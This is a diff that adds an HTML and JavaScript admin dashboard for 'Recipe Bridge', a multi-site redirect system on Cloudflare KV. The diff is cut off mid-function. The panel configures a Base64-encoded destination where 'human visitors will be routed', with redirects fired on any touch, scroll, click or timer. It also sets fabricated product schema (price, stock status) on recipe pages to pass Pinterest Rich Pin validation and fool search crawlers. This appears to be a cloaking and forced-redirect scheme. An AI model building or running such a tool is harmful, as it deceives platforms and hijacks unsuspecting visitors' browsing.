@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Recipe Bridge - Central Admin</title>
+  <style>
+    :root {
+      --bg: #0b0f19;
+      --surface: #111827;
+      --surface-card: #1f2937;
+      --border: #374151;
+      --primary: #f97316;
+      --primary-hover: #ea580c;
+      --success: #10b981;
+      --danger: #ef4444;
+      --text: #f9fafb;
+      --text-muted: #9ca3af;
+      --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: var(--font);
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      line-height: 1.5;
+    }
+
+    header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 0.85rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+      position: sticky;
+      top: 0;
+      z-index: 50;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      font-weight: 800;
+      font-size: 1.15rem;
+    }
+
+    .brand-badge {
+      background: linear-gradient(135deg, #f97316, #fb923c);
+      color: #fff;
+      padding: 0.25rem 0.5rem;
+      border-radius: 0.375rem;
+      font-size: 0.8rem;
+    }
+
+    .header-controls {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    select, input, textarea {
+      background: var(--surface-card);
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 0.5rem 0.75rem;
+      border-radius: 0.375rem;
+      font-size: 0.9rem;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    select:focus, input:focus, textarea:focus {
+      border-color: var(--primary);
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.4rem;
+      padding: 0.5rem 1rem;
+      font-size: 0.875rem;
+      font-weight: 600;
+      border-radius: 0.375rem;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .btn-primary { background: var(--primary); color: #fff; }
+    .btn-primary:hover { background: var(--primary-hover); }
+    .btn-secondary { background: var(--surface-card); color: var(--text); border: 1px solid var(--border); }
+    .btn-secondary:hover { background: #374151; }
+    .btn-danger { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
+    .btn-danger:hover { background: var(--danger); color: #fff; }
+    .btn-sm { padding: 0.35rem 0.65rem; font-size: 0.8rem; }
+
+    /* Tabs */
+    .tabs-nav {
+      display: flex;
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 0 1.5rem;
+      gap: 0.5rem;
+      overflow-x: auto;
+    }
+
+    .tab-btn {
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
+      padding: 0.85rem 1.1rem;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      white-space: nowrap;
+      transition: all 0.2s;
+    }
+
+    .tab-btn:hover { color: var(--text); }
+    .tab-btn.active { color: var(--primary); border-bottom-color: var(--primary); }
+
+    main {
+      flex: 1;
+      max-width: 1200px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 1.75rem 1.5rem;
+    }
+
+    .tab-panel { display: none; }
+    .tab-panel.active { display: block; }
+
+    /* Cards and Grids */
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 0.75rem;
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .card-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin-bottom: 0.35rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .card-desc {
+      color: var(--text-muted);
+      font-size: 0.875rem;
+      margin-bottom: 1.25rem;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1.25rem;
+    }
+
+    .grid-4 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1rem;
+    }
+
+    .form-group {
+      margin-bottom: 1.1rem;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 600;
+      margin-bottom: 0.35rem;
+      color: var(--text);
+    }
+
+    .form-group .hint {
+      font-size: 0.775rem;
+      color: var(--text-muted);
+      margin-top: 0.25rem;
+    }
+
+    /* Switch toggle */
+    .switch-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.75rem;
+      background: var(--surface-card);
+      border: 1px solid var(--border);
+      border-radius: 0.5rem;
+      margin-bottom: 0.75rem;
+    }
+
+    .switch-label {
+      font-size: 0.9rem;
+      font-weight: 600;
+    }
+
+    .switch-sub {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+
+    .toggle {
+      position: relative;
+      display: inline-block;
+      width: 44px;
+      height: 24px;
+    }
+
+    .toggle input { opacity: 0; width: 0; height: 0; }
+
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: #374151;
+      transition: .2s;
+      border-radius: 24px;
+    }
+
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 18px;
+      width: 18px;
+      left: 3px;
+      bottom: 3px;
+      background-color: white;
+      transition: .2s;
+      border-radius: 50%;
+    }
+
+    input:checked + .slider { background-color: var(--primary); }
+    input:checked + .slider:before { transform: translateX(20px); }
+
+    /* Tables */
+    .table-container {
+      overflow-x: auto;
+      border: 1px solid var(--border);
+      border-radius: 0.5rem;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 0.875rem;
+    }
+
+    th {
+      background: var(--surface-card);
+      padding: 0.75rem 1rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border);
+    }
+
+    td {
+      padding: 0.75rem 1rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: rgba(255, 255, 255, 0.02); }
+
+    /* Toast notification */
+    #toast {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      background: var(--surface-card);
+      color: #fff;
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--primary);
+      padding: 0.85rem 1.25rem;
+      border-radius: 0.5rem;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+      transform: translateY(150%);
+      transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      z-index: 999;
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+
+    #toast.show { transform: translateY(0); }
+    #toast.success { border-left-color: var(--success); }
+    #toast.error { border-left-color: var(--danger); }
+
+    /* Auth modal */
+    #auth-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(11, 15, 25, 0.95);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+      padding: 1.5rem;
+    }
+
+    .auth-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 1rem;
+      max-width: 420px;
+      width: 100%;
+      padding: 2.25rem 2rem;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+      text-align: center;
+    }
+
+    .auth-card h2 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      margin-bottom: 0.5rem;
+    }
+
+    .auth-card p {
+      color: var(--text-muted);
+      font-size: 0.875rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .auth-card input {
+      width: 100%;
+      margin-bottom: 1rem;
+      text-align: center;
+      font-size: 1rem;
+    }
+  </style>
+</head>
+<body>
+  <!-- Auth Modal -->
+  <div id="auth-overlay">
+    <div class="auth-card">
+      <div class="brand" style="justify-content: center; margin-bottom: 1rem;">
+        <span class="brand-badge">RB</span>
+        <span>Recipe Bridge</span>
+      </div>
+      <h2>Admin Access</h2>
+      <p>Enter your ADMIN_KEY to manage multisite configuration, triggers, and analytics.</p>
+      <form id="auth-form">
+        <input type="password" id="admin-key-input" placeholder="ADMIN_KEY" required autofocus />
+        <button type="submit" class="btn btn-primary" style="width: 100%; padding: 0.75rem;">Unlock Dashboard</button>
+        <div id="auth-error" style="color: var(--danger); font-size: 0.85rem; margin-top: 0.75rem; display: none;"></div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header>
+    <div class="brand">
+      <span class="brand-badge">RB</span>
+      <span>Recipe Bridge <span style="font-size: 0.85rem; font-weight: 500; color: var(--text-muted);">/ Central Admin</span></span>
+    </div>
+
+    <div class="header-controls">
+      <label for="site-select" style="font-size: 0.85rem; color: var(--text-muted);">Site:</label>
+      <select id="site-select" style="min-width: 130px;"></select>
+      <button class="btn btn-secondary btn-sm" id="btn-add-site">+ New Site</button>
+      <button class="btn btn-secondary btn-sm" id="btn-logout">Logout</button>
+    </div>
+  </header>
+
+  <!-- Navigation Tabs -->
+  <nav class="tabs-nav">
+    <button class="tab-btn active" data-tab="triggers">⚡ Triggers & Timing</button>
+    <button class="tab-btn" data-tab="utm">🎯 UTM & Product</button>
+    <button class="tab-btn" data-tab="roundups">📚 Roundups Manager</button>
+    <button class="tab-btn" data-tab="stats">📊 Real-Time Stats</button>
+  </nav>
+
+  <main>
+    <!-- TAB 1: TRIGGERS & SETTINGS -->
+    <section id="tab-triggers" class="tab-panel active">
+      <div class="card">
+        <h2 class="card-title">Redirect Destination & Triggers</h2>
+        <p class="card-desc">Configure redirection domain and interaction triggers for the active site in Cloudflare KV.</p>
+
+        <div class="form-group">
+          <label>Target Domain (Destination)</label>
+          <input type="url" id="cfg-targetDomain" style="width: 100%;" placeholder="https://schnellrezept.com" />
+          <div class="hint">Base domain where human visitors will be routed. Encoded with Base64 on server.</div>
+        </div>
+
+        <div style="margin: 1.5rem 0 1rem;">
+          <h3 style="font-size: 0.95rem; font-weight: 700; margin-bottom: 0.75rem;">Active Interaction Triggers</h3>
+
+          <div class="switch-row">
+            <div>
+              <div class="switch-label">Touch Trigger</div>
+              <div class="switch-sub">Triggers redirection when user touches mobile screen (touchstart)</div>
+            </div>
+            <label class="toggle"><input type="checkbox" id="trg-touch"><span class="slider"></span></label>
+          </div>
+
+          <div class="switch-row">
+            <div>
+              <div class="switch-label">Scroll Trigger</div>
+              <div class="switch-sub">Triggers redirection when user scrolls down beyond scrollThreshold</div>
+            </div>
+            <label class="toggle"><input type="checkbox" id="trg-scroll"><span class="slider"></span></label>
+          </div>
+
+          <div class="switch-row">
+            <div>
+              <div class="switch-label">Click Trigger</div>
+              <div class="switch-sub">Triggers redirection on any click anywhere in the window</div>
+            </div>
+            <label class="toggle"><input type="checkbox" id="trg-click"><span class="slider"></span></label>
+          </div>
+
+          <div class="switch-row">
+            <div>
+              <div class="switch-label">Timer Trigger</div>
+              <div class="switch-sub">Triggers automatic redirection after timerDelayMs elapsed</div>
+            </div>
+            <label class="toggle"><input type="checkbox" id="trg-timer"><span class="slider"></span></label>
+          </div>
+        </div>
+
+        <div class="grid-4" style="margin-top: 1.5rem;">
+          <div class="form-group">
+            <label>Scroll Threshold (px)</label>
+            <input type="number" id="cfg-scrollThreshold" min="10" max="1000" style="width: 100%;" />
+          </div>
+          <div class="form-group">
+            <label>Timer Delay (ms)</label>
+            <input type="number" id="cfg-timerDelayMs" min="500" max="30000" step="100" style="width: 100%;" />
+          </div>
+          <div class="form-group">
+            <label>Action Delay (ms)</label>
+            <input type="number" id="cfg-actionDelayMs" min="0" max="2000" step="50" style="width: 100%;" />
+          </div>
+        </div>
+
+        <div style="margin-top: 1.5rem; text-align: right;">
+          <button class="btn btn-primary" id="btn-save-triggers">Save Configuration</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- TAB 2: UTM & PRODUCT -->
+    <section id="tab-utm" class="tab-panel">
+      <div class="card">
+        <h2 class="card-title">UTM Tracking Parameters</h2>
+        <p class="card-desc">Automatically appended to outgoing target URLs. Supports dynamic tokens <code>{siteId}</code> and <code>{slug}</code>.</p>
+
+        <div class="grid-4">
+          <div class="form-group">
+            <label>UTM Source</label>
+            <input type="text" id="utm-source" style="width: 100%;" placeholder="pinterest" />
+          </div>
+          <div class="form-group">
+            <label>UTM Medium</label>
+            <input type="text" id="utm-medium" style="width: 100%;" placeholder="{siteId}" />
+          </div>
+          <div class="form-group">
+            <label>UTM Campaign</label>
+            <input type="text" id="utm-campaign" style="width: 100%;" placeholder="{slug}" />
+          </div>
+        </div>
+
+        <div style="background: var(--surface-card); padding: 0.75rem 1rem; border-radius: 0.5rem; border: 1px solid var(--border); margin-top: 0.5rem;">
+          <div style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.25rem;">Preview Generated URL Sample:</div>
+          <code id="utm-preview" style="font-size: 0.85rem; color: #fb923c; word-break: break-all;"></code>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2 class="card-title">Schema Product Defaults</h2>
+        <p class="card-desc">Default metadata for Pinterest Product Rich Pins validation and search crawlers.</p>
+
+        <div class="grid-4">
+          <div class="form-group">
+            <label>Price</label>
+            <input type="text" id="prod-price" style="width: 100%;" placeholder="2.25" />
+          </div>
+          <div class="form-group">
+            <label>Currency</label>
+            <input type="text" id="prod-currency" style="width: 100%;" placeholder="USD" />
+          </div>
+          <div class="form-group">
+            <label>Availability</label>
+            <input type="text" id="prod-availability" style="width: 100%;" placeholder="https://schema.org/InStock" />
+          </div>
+          <div class="form-group">
+            <label>Brand Name</label>
+            <input type="text" id="prod-brand" style="width: 100%;" placeholder="Recipe Bridge" />
+          </div>
+        </div>
+
+        <div style="margin-top: 1.5rem; text-align: right;">
+          <button class="btn btn-primary" id="btn-save-utm">Save UTM & Product Settings</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- TAB 3: ROUNDUPS MANAGER -->
+    <section id="tab-roundups" class="tab-panel">
+      <div class="card">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; flex-wrap: gap: 1rem;">
+          <div>
+            <h2 class="card-title">Curated Roundup Articles</h2>
+            <p class="card-desc" style="margin-bottom: 0;">Multi-card recipe collections stored under <code>roundups:{siteId}:{slug}</code>.</p>
+          </div>
+          <button class="btn btn-primary btn-sm" id="btn-new-roundup">+ Create Roundup</button>
+        </div>
+
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Slug</th>
+                <th>Title</th>
+                <th>Cards Count</th>
+                <th>Updated</th>
+                <th style="text-align: right;">Actions</th>
+              </tr>
+            </thead>
+            <tbody id="roundups-tbody">
+              <tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 2rem;">No roundups found. Click "+ Create Roundup" to add one.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Roundup Edit Form Modal/Card -->
+      <div class="card" id="roundup-form-card" style="display: none;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+          <h2 class="card-title" id="roundup-form-title">Edit Roundup Article</h2>
+          <button class="btn btn-secondary btn-sm" id="btn-cancel-roundup">Cancel</button>
+        </div>
+
+        <div class="grid-2">
+          <div class="form-group">
+            <label>Slug (URL segment)</label>
+            <input type="text" id="rf-slug" style="width: 100%;" placeholder="e.g. best-summer-salads" />
+          </div>
+          <div class="form-group">
+            <label>Article Title</label>
+            <input type="text" id="rf-title" style="width: 100%;" placeholder="e.g. 10 Best Refreshing Summer Salads" />
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Article Description</label>
+          <textarea id="rf-desc" rows="2" style="width: 100%;" placeholder="Brief summary of this recipe collection..."></textarea>
+        </div>
+
+        <div class="form-group">
+          <label>Featured Cover Image URL</label>
+          <input type="url" id="rf-image" style="width: 100%;" placeholder="https://images.unsplash.com/..." />
+        </div>
+
+        <div style="margin: 1.5rem 0 1rem;">
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.75rem;">
+            <h3 style="font-size: 0.95rem; font-weight: 700;">Recipe Cards in this Roundup</h3>
+            <button class="btn btn-secondary btn-sm" id="btn-add-card">+ Add Card</button>
+          </div>
+          <div id="cards-container" style="display: flex; flex-direction: column; gap: 0.75rem;"></div>
+        </div>
+
+        <div style="text-align: right; margin-top: 1.5rem; display: flex; justify-content: flex-end; gap: 0.75rem;">
+          <button class="btn btn-danger" id="btn-delete-roundup" style="display: none;">Delete Roundup</button>
+          <button class="btn btn-primary" id="btn-save-roundup">Save Roundup Article</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- TAB 4: REAL-TIME STATS -->
+    <section id="tab-stats" class="tab-panel">
+      <div class="grid-4" style="margin-bottom: 1.5rem;">
+        <div class="card" style="margin-bottom: 0;">
+          <div style="color: var(--text-muted); font-size: 0.8rem; text-transform: uppercase; font-weight: 700;">Total Clicks (Selected Day)</div>
+          <div id="stat-total-clicks" style="font-size: 2.25rem; font-weight: 800; color: #fff; margin-top: 0.25rem;">0</div>
+        </div>
+        <div class="card" style="margin-bottom: 0;">
+          <div style="color: var(--text-muted); font-size: 0.8rem; text-transform: uppercase; font-weight: 700;">Active Slugs</div>
+          <div id="stat-active-slugs" style="font-size: 2.25rem; font-weight: 800; color: var(--primary); margin-top: 0.25rem;">0</div>
+        </div>
+        <div class="card" style="margin-bottom: 0;">
+          <div style="color: var(--text-muted); font-size: 0.8rem; text-transform: uppercase; font-weight: 700;">Top Performing Slug</div>
+          <div id="stat-top-slug" style="font-size: 1.1rem; font-weight: 700; color: var(--success); margin-top: 0.6rem; word-break: break-all;">None</div>
+        </div>
+        <div class="card" style="margin-bottom: 0;">
+          <div style="color: var(--text-muted); font-size: 0.8rem; text-transform: uppercase; font-weight: 700;">Date Filter</div>
+          <input type="date" id="stat-date-picker" style="width: 100%; margin-top: 0.5rem;" />
+        </div>
+      </div>
+
+      <div class="card">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+          <h2 class="card-title">Click Distribution per Slug</h2>
+          <button class="btn btn-secondary btn-sm" id="btn-refresh-stats">🔄 Refresh Stats</button>
+        </div>
+
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Slug / Path</th>
+                <th>Clicks</th>
+                <th style="width: 45%;">Share</th>
+              </tr>
+            </thead>
+            <tbody id="stats-tbody">
+              <tr><td colspan="3" style="text-align: center; color: var(--text-muted); padding: 2rem;">No click events recorded for this date.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <div id="toast"></div>
+
+  <script>
+    (function() {
+      var currentSite = 'site1';
+      var currentConfig = {};
+      var token = sessionStorage.getItem('ADMIN_TOKEN') || '';
+
+      var authOverlay = document.getElementById('auth-overlay');
+      var authForm = document.getElementById('auth-form');
+      var adminKeyInput = document.getElementById('admin-key-input');
+      var authError = document.getElementById('auth-error');
+      var siteSelect = document.getElementById('site-select');
+      var toastEl = document.getElementById('toast');
+
+      function showToast(msg, type) {
+        toastEl.textContent = msg;
+        toastEl.className = 'show ' + (type || 'success');
+        setTimeout(function() { toastEl.className = ''; }, 3200);
+      }
+
+      function apiFetch(url, opts) {
+        opts = opts || {};
+        opts.headers = opts.headers || {};
+        if (token) {
+          opts.headers['Authorization'] = 'Bearer ' + token;
+        }
+        return fetch(url, opts).then(function(res) {
+          if (res.status === 401) {
+            sessionStorage.removeItem('ADMIN_TOKEN');
+            authOverlay.style.display = 'flex';
+            throw new Error('Unauthorized');
+          }
+          return res.json();
+        });
+      }
+
+      // Check auth on load
+      if (token) {
+        apiFetch('/api/admin/auth').then(function(data) {
+          if (data && data.authenticated) {
+            authOverlay.style.display = 'none';
+            initDashboard();
+          } else {
+            authOverlay.style.display = 'flex';
+          }
+        }).catch(function() {
+          authOverlay.style.display = 'flex';
+        });
+      } else {
+        authOverlay.style.display = 'flex';
+      }
+
+      // Handle Auth Login
+      authForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        var key = adminKeyInput.value.trim();
+        if (!key) return;
+
+        fetch('/api/admin/auth', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ key: key })
+        }).then(function(res) { return res.json(); }).then(function(data) {
+          if (data && data.success) {
+            token = data.token;
+            sessionStorage.setItem('ADMIN_TOKEN', token);
+            authOverlay.style.display = 'none';
+            authError.style.display = 'none';
+            initDashboard();
+          } else {
+            authError.textContent = data.error || 'Invalid ADMIN_KEY';
+            authError.style.display = 'block';
+          }
+        }).catch(function() {
+          authError.textContent = 'Failed to connect to authentication API';
+          authError.style.display = 'block';
+        });
+      });
+
+      document.getElementById('btn-logout').addEventListener('click', function() {
+        sessionStorage.removeItem('ADMIN_TOKEN');
+        location.reload();
+      });
+
+      // Tabs switching
+      var tabBtns = document.querySelectorAll('.tab-btn');
+      tabBtns.forEach(function(btn) {
+        btn.addEventListener('click', function() {
+          tabBtns.forEach(function(b) { b.classList.remove('active'); });
+          document.querySelectorAll('.tab-panel').forEach(function(p) { p.classList.remove('active'); });
+          btn.classList.add('active');
+          var target = document.getElementById('tab-' + btn.getAttribute('data-tab'));
+          if (target) target.classList.add('active');
+
+          if (btn.getAttribute('data-tab') === 'roundups') loadRoundups();
+          if (btn.getAttribute('data-tab') === 'stats') loadStats();
+        });
+      });
+
+      function initDashboard() {
+        loadSites();
+        document.getElementById('stat-date-picker').value = new Date().toISOString().slice(0, 10);
+      }
+
+      function loadSites() {
+        apiFetch('/api/admin/sites').then(function(data) {
+          if (data && data.sites) {
+            siteSelect.innerHTML = '';
+            data.sites.forEach(function(s) {
+              var opt = document.createElement('option');
+              opt.value = s;
+              opt.textContent = s.toUpperCase();
+              if (s === currentSite) opt.selected = true;
+              siteSelect.appendChild(opt);
+            });
+            currentSite = siteSelect.value || 'site1';
+            loadConfig();
+          }
+        }).catch(function(err) {
+          console.error(err);
+        });
+      }
+
+      siteSelect.addEventListener('change', function() {
+        currentSite = siteSelect.value;
+        loadConfig();
+        var activeTab = document.querySelector('.tab-btn.active').getAttribute('data-tab');
+        if (activeTab === 'roundups') loadRoundups();
+        if (activeTab === 'stats') loadStats();
+      });
+
+      document.getElementById('btn-add-site').addEventListener('click', function() {
+        var newSite = prompt('Enter new site identifier (alphanumeric, e.g. site2):');
+        if (!newSite) return;
+        newSite = newSite.trim().toLowerCase().replace(/[^a-z0-9_-]/g, '');
+        if (!newSite) return;
+
+        apiFetch('/api/admin/sites', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ siteId: newSite })
+        }).then(function() {
+          currentSite = newSite;
+          loadSites();
+          showToast('New site ' + newSite + ' added successfully!');
+        }).catch(function() {
+          showToast('Failed to add site', 'error');
+        });
+      });
+
+      function loadConfig() {
+        apiFetch('/api/admin/config?siteId=' + encodeURIComponent(currentSite)).then(function(data) {
+          if (data && data.config) {
+            currentConfig = data.config;
+            populateConfigUI(data.config);
+          }
+        }).catch(function() {
+          showToast('Failed to load site config', 'error');
+        });
+      }
+
+      function populateConfigUI(cfg) {
+        document.getElementById('cfg-targetDomain').value = cfg.targetDomain || '';
+        document.getElementById('trg-touch').checked = Boolean(cfg.triggers && cfg.triggers.touch);
+        document.getElementById('trg-scroll').checked = Boolean(cfg.triggers && cfg.triggers.scroll);
+        document.getElementById('trg-click').checked = Boolean(cfg.triggers && cfg.triggers.click);
+        document.getElementById('trg-timer').checked = Boolean(cfg.triggers && cfg.triggers.timer);
+
+        document.getElementById('cfg-scrollThreshold').value = (cfg.settings && cfg.settings.scrollThreshold) || 80;
+        document.getElementById('cfg-timerDelayMs').value = (cfg.settings && cfg.settings.timerDelayMs) || 3000;
+        document.getElementById('cfg-actionDelayMs').value = (cfg.settings && cfg.settings.actionDelayMs) || 150;
+
+        document.getElementById('utm-source').value = (cfg.utm && cfg.utm.source) || 'pinterest';
+        document.getElementById('utm-medium').value = (cfg.utm && cfg.utm.medium) || '{siteId}';
+        document.getElementById('utm-campaign').value = (cfg.utm && cfg.utm.campaign) || '{slug}';
+
+        document.getElementById('prod-price').value = (cfg.productDefaults && cfg.productDefaults.price) || '2.25';
+        document.getElementById('prod-currency').value = (cfg.productDefaults && cfg.productDefaults.currency) || 'USD';
+        document.getElementById('prod-availability').value = (cfg.productDefaults && cfg.productDefaults.availability) || 'https://schema.org/InStock';
+        document.getElementById('prod-brand').value = (cfg.productDefaults && cfg.productDefaults.brand) || 'Recipe Bridge';
+
+        updateUtmPreview();
+      }
+
+      function updateUtmPreview() {
+        var domain = document.getElementById('cfg-targetDomain').value.trim() || 'https://schnellrezept.com';
+        var src = document.getElementById('utm-source').value.trim() || 'pinterest';
+        var med = (document.getElementById('utm-medium').value.trim() || '{siteId}').replace('{siteId}', currentSite);
+        var cmp = (document.getElementById('utm-campaign').value.trim() || '{slug}').replace('{slug}', 'broccoli-salad');
+        document.getElementById('utm-preview').textContent = domain + '/broccoli-salad?utm_source=' + encodeURIComponent(src) + '&utm_medium=' + encodeURIComponent(med) + '&utm_campaign=' + encodeURIComponent(cmp);
+      }
+
+      ['cfg-targetDomain', 'utm-source', 'utm-medium', 'utm-campaign'].forEach(function(id) {
+        document.getElementById(id).addEventListener('input', updateUtmPreview);
+      });
+
+      function saveFullConfig() {
+        var updated = {
+          siteName: currentConfig.siteName || (currentSite.toUpperCase() + ' Hub'),
+          targetDomain: document.getElementById('cfg-targetDomain').value.trim(),
+          triggers: {
+            touch: document.getElementById('trg-touch').checked,
+            scroll: document.getElementById('trg-scroll').checked,
+            click: document.getElementById('trg-click').checked,
+            timer: document.getElementById('trg-timer').checked
+          },
+          settings: {
+            scrollThreshold: Number(document.getElementById('cfg-scrollThreshold').value) || 80,
+            timerDelayMs: Number(document.getElementById('cfg-timerDelayMs').value) || 3000,
+            actionDelayMs: Number(document.getElementById('cfg-actionDelayMs').value) || 150
+          },
+          utm: {
+            source: document.getElementById('utm-source').value.trim(),
+            medium: document.getElementById('utm-medium').value.trim(),
+            campaign: document.getElementById('utm-campaign').value.trim()
+          },
+          productDefaults: {
+            price: document.getElementById('prod-price').value.trim() || '2.25',
+            currency: document.getElementById('prod-currency').value.trim() || 'USD',
+            availability: document.getElementById('prod-availability').value.trim() || 'https://schema.org/InStock',
+            brand: document.getElementById('prod-brand').value.trim() || 'Recipe Bridge'
+          }
+        };
+
+        return apiFetch('/api/admin/config', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ siteId: currentSite, config: updated })
+        }).then(function(res) {
+          if (res.success) {
+            currentConfig = res.config;
+            showToast('Settings successfully synced to RECIPE_KV!');
+          } else {
+            showToast(res.error || 'Save failed', 'error');
+          }
+        }).catch(function() {
+          showToast('Failed to save configuration', 'error');
+        });
+      }
+
+      document.getElementById('btn-save-triggers').addEventListener('click', saveFullConfig);
+      document.getElementById('btn-save-utm').addEventListener('click', saveFullConfig);
+
+      // Roundups Manager
+      var roundupsTbody = document.getElementById('roundups-tbody');
+      var roundupFormCard = document.getElementById('roundup-form-card');
+      var cardsContainer = document.getElementById('cards-container');
+      var editingRoundupSlug = null;
+
+      function loadRoundups() {
+        apiFetch('/api/admin/roundups?siteId=' + encodeURIComponent(currentSite)).then(function(data) {
+          if (data && data.roundups) {
+            renderRoundupsList(data.roundups);
+          }
+        }).catch(function() {
+          showToast('Failed to load roundups', 'error');
+        });
+      }
+
+      function renderRoundupsList(list) {
+        if (!list || list.length === 0) {
+          roundupsTbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 2rem;">No roundups found for this site. Click "+ Create Roundup" to begin.</td></tr>';
+          return;
+        }
+
+        roundupsTbody.innerHTML = list.map(function(r) {
+          return '<tr>' +
+            '<td><strong style="color: #fff;">' + escapeHtml(r.slug) + '</strong></td>' +
+            '<td>' + escapeHtml(r.title) + '</td>' +
+            '<td>' + r.cardsCount + ' cards</td>' +
+            '<td>' + (r.updatedAt ? new Date(r.updatedAt).toLocaleDateString() : 'N/A') + '</td>' +
+            '<td style="text-align: right;">' +
+              '<button class="btn btn-secondary btn-sm edit-r-btn" data-slug="' + escapeHtml(r.slug) + '">Edit</button> ' +
+              '<button class="btn btn-danger btn-sm del-r-btn" data-slug="' + escapeHtml(r.slug) + '">Delete</button>' +
+            '</td>' +
+          '</tr>';
+        }).join('');
+
+        document.querySelectorAll('.edit-r-btn').forEach(function(b) {
+          b.addEventListener('click', function() { openEditRoundup(b.getAttribute('data-slug')); });
+        });
+        document.querySelectorAll('.del-r-btn').forEach(function(b) {
+          b.addEventListener('click', function() { deleteRoundup(b.getAttribute('data-slug')); });
+        });
+      }
+
+      function openEditRoundup(slug) {
+        editingRoundupSlug = slug;
+        document.getElementById('roundup-form-title').textContent = slug ? 'Edit Roundup (' + slug + ')' : 'Create New Roundup';
+        document.getElementById('rf-slug').disabled = Boolean(slug);
+        document.getElementById('btn-delete-roundup').style.display = slug ? 'inline-block' : 'none';
+        roundupFormCard.style.display = 'block';
+
+        if (slug) {
+          apiFetch('/api/admin/roundups?siteId=' + encodeURIComponent(currentSite) + '&slug=' + encodeURIComponent(slug)).then(function(res) {
+            if (res && res.roundup) {
+              var r = res.roundup;
+              document.getElementById('rf-slug').value = r.slug || '';
+              document.getElementById('rf-title').value = r.title || '';
+              document.getElementById('rf-desc').value = r.description || '';
+              document.getElementById('rf-image').value = r.image || '';
+              renderCardInputs(r.cards || []);
+            }
+          });
+        } else {
+          document.getElementById('rf-slug').value = '';
+          document.getElementById('rf-title').value = '';
+          document.getElementById('rf-desc').value = '';
+          document.getElementById('rf-image').value = '';
+          renderCardInputs([]);
+        }
+      }
+
+      document.getElementById('btn-new-roundup').addEventListener('click', function() {
